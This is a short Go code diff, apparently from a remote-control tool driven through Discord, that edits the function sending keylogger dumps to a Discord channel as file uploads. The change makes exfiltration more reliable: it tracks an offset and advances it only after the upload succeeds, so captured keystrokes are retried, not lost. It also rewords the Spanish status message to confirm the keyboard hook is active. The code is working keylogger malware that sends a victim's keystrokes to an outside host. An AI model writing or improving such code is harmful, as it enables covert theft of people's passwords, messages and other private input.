@@ -75,9 +75,9 @@ func KeylogStop(s *discordgo.Session, i *discordgo.InteractionCreate) {
 }
 
 func sendKeylogDump(s *discordgo.Session, i *discordgo.InteractionCreate) {
-	data := win32.Default.Dump()
+	data, offset := win32.Default.Dump()
 	if data == "" {
-		Finish(s, i, "ℹ️ El buffer del keylogger está vacío.")
+		Finish(s, i, "ℹ️ Keylog vacío — el hook está activo y no hay teclas nuevas desde el último dump.")
 		return
 	}
 	content := fmt.Sprintf("🔑 Keylog dump — %d bytes", len(data))
@@ -91,5 +91,9 @@ func sendKeylogDump(s *discordgo.Session, i *discordgo.InteractionCreate) {
 		Files:   []*discordgo.File{file},
 	}); err != nil {
 		Finish(s, i, "❌ No se pudo subir el dump: "+err.Error())
+		return
 	}
+	// El puntero solo avanza cuando el archivo salió: si Discord falla, el
+	// mismo texto se reintenta en el siguiente dump en vez de perderse.
+	win32.Default.Commit(offset)
 }
